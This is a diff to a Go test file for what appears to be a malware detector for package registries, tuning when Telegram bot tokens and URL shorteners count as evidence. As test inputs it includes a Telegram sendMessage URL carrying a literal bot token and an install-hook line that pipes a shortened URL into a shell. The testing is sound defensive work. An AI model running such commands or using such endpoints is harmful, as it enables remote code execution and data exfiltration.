@@ -74,11 +74,37 @@ func TestTheSameStringsStillMintWhereTheyRunUnattended(t *testing.T) {
 	}
 }
 
-// A literal bot token is hostile wherever it sits: a library author never ships their own.
-func TestTelegramBotTokenIsEvidenceInLibrarySource(t *testing.T) {
+// A literal bot token in npm library source stays evidence. On the other registries it is a leaked
+// credential more often than an exfiltration channel: the two packagist mints carrying one were a
+// developer's own debug call (`...&text=sadasd`) and a sanitizer's test fixture.
+func TestTelegramBotTokenIsEvidenceOnNpmOnly(t *testing.T) {
 	line := `ENDPOINT = "https://api.telegram.org/bot8759663177:AAH3EBXqymku9MUAtu73uPKvNLFmkhM256s/sendMessage"`
-	if !libraryMints("pypi", line) {
-		t.Errorf("a hard-coded Telegram bot token should mint; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: line})))
+	if !libraryMints("npm", line) {
+		t.Errorf("a hard-coded Telegram bot token should mint on npm; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "npm", PkgbuildContent: line})))
+	}
+	for _, eco := range []string{"pypi", "packagist", "cargo", "go"} {
+		if libraryMints(eco, line) {
+			t.Errorf("%s: a leaked token in library source minted malware", eco)
+		}
+	}
+}
+
+// URL shorteners: bitly/is.gd/tinyurl CLIENTS, docs and tests name them. OpenSSF: pypi 1 of 123
+// carrying packages confirmed, npm 1 of 83.
+func TestURLShortenerInLibrarySourceIsNotEvidence(t *testing.T) {
+	for _, tc := range []struct{ eco, line string }{
+		{"packagist", `$this->assertSame('http://bit.ly/1VmfKqV', $this->bitlyClient->getUrl('https://www.test.com/foo'));`},
+		{"packagist", `return 'http://is.gd/api.php?longurl=' . rawurlencode($url);`},
+		{"pypi", `API_URL = "http://tinyurl.com/api-create.php"`},
+		{"npm", `// see http://bit.ly/1dIn55j for the guide`},
+		{"go", `const shortener = "https://is.gd/create.php"`},
+	} {
+		if libraryMints(tc.eco, tc.line) {
+			t.Errorf("%s: shortener in library source minted malware: %q", tc.eco, tc.line)
+		}
+	}
+	if !hookMints("pypi", `curl -sL https://bit.ly/3xAbC | sh`) {
+		t.Error("a shortener piped to a shell in an install hook must still mint")
 	}
 }
 
